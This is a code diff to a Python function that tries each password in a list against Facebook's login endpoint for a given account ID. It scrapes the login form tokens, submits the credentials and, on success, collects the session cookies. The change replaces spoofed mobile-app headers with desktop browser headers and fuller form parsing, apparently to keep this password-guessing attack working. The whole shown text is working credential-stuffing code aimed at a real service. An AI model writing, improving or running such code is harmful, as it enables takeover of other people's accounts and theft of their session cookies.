@@ -1201,39 +1201,51 @@ def m6(idf,pw):
  try:
   for ps in pw:
    session = requests.Session()
-            #animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
-            #sys.stdout.write(f'\r     {K}[{H}{animasi}{P}/{A}%s{K}]{N}OK{B}>{H}%s'%(loop,len(ok))),
-            #sys.stdout.flush()
-   pro = random.choice(ugen)
-   free_fb = session.get('https://m.facebook.com').text
-   log_data = {
-             "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":idf,
-            "pass":ps,
-            "login":"Log In"}
-   header_freefb = {
-    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Mobile/14E304 [FBAN/FBIOS;FBAV/99.0.0.45.172;FBBV/35196872;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/10.3.1;FBSS/2;FBCR/;FBID/phone;FBLC/en_US;FBOP/5]',
+   headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
     'Content-Type': 'application/x-www-form-urlencoded',
-    'Host': 'graph.facebook.com',
-    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-    'X-FB-Connection-Type': 'MOBILE.LTE',
-    'X-Tigon-Is-Retry': 'False',
-    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-    'x-fb-device-group': '5120',
-    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-    'X-FB-Request-Analytics-Tags': 'graphservice',
-    'X-FB-HTTP-Engine': 'Liger',
-    'X-FB-Client-IP': 'True',
-    'X-FB-Server-Cluster': 'True',
-    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
-    'Content-Length': '706'}
-   lo = session.post('https://www.facebook.com/login/device-based/regular/login/',data=log_data,headers=header_freefb).text
+    'Host': 'www.facebook.com',
+    'Origin': 'https://www.facebook.com',
+    'Referer': 'https://www.facebook.com/',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Connection': 'keep-alive'}
+   login_page_response = session.get(url, headers=headers)
+   login_page_content = login_page_response.text
+   soup = BeautifulSoup(login_page_content, 'html.parser')
+   lsd = soup.find('input', {'name': 'lsd'})['value']
+   jazoest = soup.find('input', {'name': 'jazoest'})['value']
+   m_ts = soup.find('input', {'name': 'm_ts'})['value']
+   li = soup.find('input', {'name': 'li'})['value']
+   try_number = soup.find('input', {'name': 'try_number'})['value'] if soup.find('input', {'name': 'try_number'}) else '0'
+   unrecognized_tries = soup.find('input', {'name': 'unrecognized_tries'})['value'] if soup.find('input', {'name': 'unrecognized_tries'}) else '0'
+   login_source = soup.find('input', {'name': 'login_source'})['value'] if soup.find('input', {'name': 'login_source'}) else ''
+   next = soup.find('input', {'name': 'next'})['value'] if soup.find('input', {'name': 'next'}) else ''
+   timezone = soup.find('input', {'name': 'timezone'})['value'] if soup.find('input', {'name': 'timezone'}) else ''
+   lgndim = soup.find('input', {'name': 'lgndim'})['value'] if soup.find('input', {'name': 'lgndim'}) else ''
+   lgnrnd = soup.find('input', {'name': 'lgnrnd'})['value'] if soup.find('input', {'name': 'lgnrnd'}) else ''
+   lgnjs = soup.find('input', {'name': 'lgnjs'})['value'] if soup.find('input', {'name': 'lgnjs'}) else ''
+   ab_test_data = soup.find('input', {'name': 'ab_test_data'})['value'] if soup.find('input', {'name': 'ab_test_data'}) else ''
+   flow = soup.find('input', {'name': 'flow'})['value'] if soup.find('input', {'name': 'flow'}) else 'login_no_pin'
+  
+   log_data = {
+    "lsd": lsd,
+    "jazoest": jazoest,
+    "m_ts": m_ts,
+    "li": li,
+    "try_number": try_number,
+    "unrecognized_tries": unrecognized_tries,
+    "email": idf,
+    "pass": ps,
+    "login": "Log In",
+    "login_source": login_source,
+    "next": next,
+    "timezone": timezone,
+    "lgndim": lgndim,
+    "lgnrnd": lgnrnd,
+    "lgnjs": lgnjs,
+    "ab_test_data": ab_test_data,
+    "flow": flow}
+   lo = session.post('https://www.facebook.com/login/device-based/regular/login/',data=log_data,headers=headers).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
